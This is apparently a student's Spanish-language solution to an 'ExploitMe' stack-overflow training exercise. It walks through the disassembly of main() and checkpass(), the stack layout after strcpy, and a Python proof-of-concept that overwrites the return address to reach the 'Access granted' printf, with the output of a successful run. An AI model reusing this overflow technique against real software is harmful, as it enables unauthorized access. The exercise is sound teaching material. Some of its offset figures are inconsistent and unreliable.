Consignas:
NOTA: Ni he enviado el .exe, ni he indicado que compilador usar (Visual Studio, gcc con DevCpp, etc..), ni que opciones de compilacion, ni si en 32 o 64 bits, sientete libre de elegir y resuelve las siguiente cuestiones sobre tu eleccion.

1.- Compilalo, e identifica la direccion de las funciones main() y checkpass()
2.- Copia el codigo ensamblador de las funciones main() y checkpass() en un fichero de texto, e identifica cada linea de C, con las que corresponda de ASM. Evita usar hex-rays y demas decompiladores, usa el debugger, pero sin referencias al codigo fuente.
3,- Dibuja el estado de la pila desde la funcion main() justo antes de ejecutar el strcpy()
4.- Cuantos bytes hay entre el ultimo byte de pass y el valor de retorno guardado de la funcion main() (RET)
5.- Desborda la variable pass para modificar el flujo del programa y se ejecuta el comando:
		printf("Access granted!\n");
No necesariamente saltando a esa direccion, pero si ejecutnado la funcion printf()


A) Se compila con:
gcc -m32 exploitme2-win.c -o exploitme2 -fno-stack-protector -z execstack

1) Direccion de Main y Checkpass

main()      => 0x0804847D
checkpass() => ox080484E0 

2) Copia el codigo e identifica cada linea en C

Main:

================= int main(int argc, char **argv) ======================
argc= dword ptr  8
argv= dword ptr  0Ch
envp= dword ptr  10h

push    ebp
mov     ebp, esp
and     esp, 0FFFFFFF0h
sub     esp, 10h

================ printf("ExploitMe - Mission 2\n"); =====================
mov     dword ptr [esp], offset s ; "ExploitMe - Mission 2"
call    _puts

========================= if(argc != 2) =================================
cmp     [ebp+argc], 2
jz      short loc_80484AB

====================== Si se cumple (ZF == 0) ============================
	
	########### printf("Please provide a password...\n"); ###############
	mov     dword ptr [esp], offset aPleaseProvideA ; "Please provide a password..."
	call    _puts

	######################### return 1; #################################
	eax, 1
	jmp     short locret_80484DE

======================= Si no se cumple (ZF == 1) =============================

	################### if(checkpass(argv[1])) #############################
	[#] Esta linea la descompongo en 2 partes, el llamado a checkpass y 
	[#] luego el if del resultado
    ######################## checkpass(argv[1]) ############################
    mov     eax, [ebp+argv]
	add     eax, 4
	mov     eax, [eax]
	mov     [esp], eax      ; src
	call    checkpass
	############################# if(****) #################################
	test    eax, eax => Si la contraseña es valida eax se setea en 1 y el FZ queda en 0 por test 0, 1
	jz      short loc_80484CD
    
    --------------------- Si no se cumple (ZF == 1) ------------------------ 
    (Esto pasa por que en la funcion checkpass, eax se pone en 1 si el strcpy da 
    correcto, al hacer test eax, eax da como resultado distinto a 0 y jz no se setea en 1)
    ##################### printf("Access granted!\n"); #####################
    mov     dword ptr [esp], offset aAccessGranted ; "Access granted!"
	call    _puts

	++++++++++++++++++++++ Si se cumple (ZF == 0) ++++++++++++++++++++++++++
	(Esto pasa por que en la funcion checkpass, eax se pone en 0 si el strcpy da 
    incorrecto, al hacer test eax, eax da como resultado 0 y jz no se setea en 1)
    ##################### printf("Access denied!\n"); ######################
    mov     dword ptr [esp], offset aAccessDenied
	call    _puts

================================= END MAIN =======================================

	############################# return 0; ##################################
	mov     eax, 0
	leave
	retn
==================================================================================

[#][#][#][#][#][#][#][#][#][#][#][#][#][#][#][#][#][#][#][#][#][#][#][#][#][#][#][#]

=========================== int checkpass(char *p) ===============================
dest= byte ptr -26h => char pass[30]
src= dword ptr  8

push    ebp
mov     ebp, esp
sub     esp, 38h

============================= strcpy(pass, p); ====================================

mov     eax, [ebp+src]
mov     [esp+4], eax    ; src
lea     eax, [ebp+dest]
mov     [esp], eax      ; dest
call    _strcpy  		=> buffer overflow copia src en dest esperando que src tenga un maximo de 38 bytes

==================== if(strcmp(pass, "stupidlyinsecure") == 0) ====================

mov     dword ptr [esp+4], offset s2 ; "stupidlyinsecure" => string de "stupidlyinsecure"
lea     eax, [ebp+dest]
mov     [esp], eax      ; s1
call    _strcmp	 
test    eax, eax => si las contraseñas son iguales eax queda en 0 y ZF se setea en 1
jnz     short loc_8048516

++++++++++++++ Si se cumple este salto (ZF == 1) osea q las contraseñas son iguales ++++++++++++++++++
####################################### return 1; ##############################################
mov     eax, 1

--------- Si no se cumple este salto (ZF == 0) osea q las contraseñas son diferentes -----------------
####################################### return 0; ##############################################
mov     eax, 0

====================================== END FUNCTION CHECKPASS =====================================
leave
retn
===================================================================================================

3) No entendi del todo la consigna pero calculo que el stack se veria medianamente asi para que se ejecute strcpy
   
   |_strcpy|
   |  dst  |
   |  src  |

4) Enviando 30 'A' al programa y analizando la disposicion del stack podemos observar:


Stack luego del strcpy:

FFCDFB40  41413AC0
FFCDFB44  41414141
FFCDFB48  41414141
FFCDFB4C  41414141
FFCDFB50  41414141
FFCDFB54  41414141
FFCDFB58  41414141
FFCDFB5C  41414141  => Ultimo byte de las 30 A
FFCDFB60  00000000  => 4 bytes
FFCDFB64  00000000  => 4 bytes
FFCDFB68  FFCDFB88  => 4 bytes
FFCDFB6C  080484BB  main+3E => 4 bytes Return Address from checkpass to main

Esto indica que entre el ultimo byte y la direccion de retorno existen 12 bytes.
Para situarnos justo en la base de EIP debemos generar un buffer overflow de 30 bytes + 12 junk + 4 bytes sustitos para EIP


5) Sabiendo lo anterior podemos deducir que hacen falta 40 bytes para pisar eip y controlar el flujo de la aplicacion.

PoC Exploit:

import struct

nopsleed = '\x90' * 42
eip = 'AAAA'
payload = nopsleed+eip

print payload

Paso final, crear un exploit funcional:

En un caso ideal, simplemente podriamos pisar EIP con la direccion de memoria de la función printf("Access granted!\n");

import os
import struct

nopsleed = '\x90' * 42
eip = struct.pack("<I", 0x080484BF)
payload = nopsleed+eip

os.system("./exploitme2 "+payload)


Output:

┌[hdbreaker@hdbreaker]-(~/Desktop/Exploit/001) 
└> python exploit.py
ExploitMe - Mission 2
Access granted!
Segmentation fault (core dumped)
